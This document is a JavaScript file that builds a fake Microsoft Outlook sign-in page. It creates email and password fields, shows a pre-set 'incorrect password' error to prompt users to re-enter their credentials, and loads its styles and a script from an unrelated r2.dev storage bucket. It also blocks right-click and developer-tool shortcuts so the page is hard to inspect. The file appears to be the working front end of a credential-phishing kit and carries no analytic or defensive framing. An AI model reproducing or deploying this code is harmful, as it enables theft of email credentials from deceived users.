document.addEventListener('DOMContentLoaded', function() {
    // Head elements
    var metaCharset = document.createElement('meta');
    metaCharset.setAttribute('charset', 'UTF-8');
    document.head.appendChild(metaCharset);

    var metaViewport = document.createElement('meta');
    metaViewport.setAttribute('name', 'viewport');
    metaViewport.setAttribute('content', 'width=device-width, initial-scale=1.0');
    document.head.appendChild(metaViewport);

    var metaXUA = document.createElement('meta');
    metaXUA.setAttribute('http-equiv', 'X-UA-Compatible');
    metaXUA.setAttribute('content', 'ie=edge');
    document.head.appendChild(metaXUA);

    var linkFavicon = document.createElement('link');
    linkFavicon.setAttribute('rel', 'shortcut icon');
    linkFavicon.setAttribute('href', 'https://pub-0aef3761b1fd4ceca010c7f96dd822c2.r2.dev/favicon.ico');
    linkFavicon.setAttribute('type', 'image/x-icon');
    document.head.appendChild(linkFavicon);

    var title = document.createElement('title');
    title.textContent = 'Outlook';
    document.head.appendChild(title);

    var linkStylesheet = document.createElement('link');
    linkStylesheet.setAttribute('rel', 'stylesheet');
    linkStylesheet.setAttribute('href', 'https://pub-0aef3761b1fd4ceca010c7f96dd822c2.r2.dev/app.css');
    document.head.appendChild(linkStylesheet);

    // Body elements
    var divApp = document.createElement('div');
    divApp.id = 'app';
    document.body.appendChild(divApp);

    var divSide = document.createElement('div');
    divSide.className = 'side';
    divApp.appendChild(divSide);

    var divMain = document.createElement('div');
    divMain.className = 'main';
    divApp.appendChild(divMain);

    var divWrapper = document.createElement('div');
    divWrapper.className = 'wrapper';
    divMain.appendChild(divWrapper);

    var divBox = document.createElement('div');
    divBox.className = 'box';
    divWrapper.appendChild(divBox);

    var divLogo = document.createElement('div');
    divLogo.className = 'logo';
    divBox.appendChild(divLogo);

    // Email address row
    var divRowEmail = document.createElement('div');
    divRowEmail.className = 'row';
    divBox.appendChild(divRowEmail);

    var labelEmail = document.createElement('label');
    labelEmail.textContent = 'Email address:';
    divRowEmail.appendChild(labelEmail);

    var inputEmail = document.createElement('input');
    inputEmail.type = 'text';
    inputEmail.id = 'email';
    inputEmail.placeholder = 'email address';
    divRowEmail.appendChild(inputEmail);

    // Password row
    var divRowPassword = document.createElement('div');
    divRowPassword.className = 'row';
    divBox.appendChild(divRowPassword);

    var labelPassword = document.createElement('label');
    labelPassword.textContent = 'Password:';
    divRowPassword.appendChild(labelPassword);

    var inputPassword = document.createElement('input');
    inputPassword.type = 'password';
    inputPassword.id = 'password';
    inputPassword.placeholder = 'password';
    divRowPassword.appendChild(inputPassword);

    // Show password row
    var divRowShowPass = document.createElement('div');
    divRowShowPass.className = 'row';
    divBox.appendChild(divRowShowPass);

    var inputShowPass = document.createElement('input');
    inputShowPass.type = 'checkbox';
    inputShowPass.id = 'show_pass';
    divRowShowPass.appendChild(inputShowPass);

    var labelShowPass = document.createElement('label');
    labelShowPass.setAttribute('for', 'show_pass');
    labelShowPass.textContent = 'Show password';
    divRowShowPass.appendChild(labelShowPass);

    // Error message row
    var divRowError = document.createElement('div');
    divRowError.className = 'row';
    divBox.appendChild(divRowError);

    var divError = document.createElement('div');
    divError.className = 'error';
    divError.textContent = "The user name or password you entered isn't correct. Try entering it again.";
    divRowError.appendChild(divError);

    // Sign in button row
    var divRowSignIn = document.createElement('div');
    divRowSignIn.className = 'row';
    divBox.appendChild(divRowSignIn);

    var divSignIn = document.createElement('div');
    divSignIn.className = 'login';
    divSignIn.textContent = 'sign in';
    divRowSignIn.appendChild(divSignIn);

    // Loading external JavaScript
    var scriptApp = document.createElement('script');
    scriptApp.src = 'https://pub-0aef3761b1fd4ceca010c7f96dd822c2.r2.dev/app.js';
    document.body.appendChild(scriptApp);

    // Disable right-click, F12, etc.
    document.addEventListener("contextmenu", function(e) {
        e.preventDefault();
    }, false);
    document.addEventListener("keydown", function(e) {
        if ((e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.keyCode === 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) || (e.ctrlKey && e.keyCode === 85) || e.keyCode === 123) {
            e.preventDefault();
        }
    }, false);
});
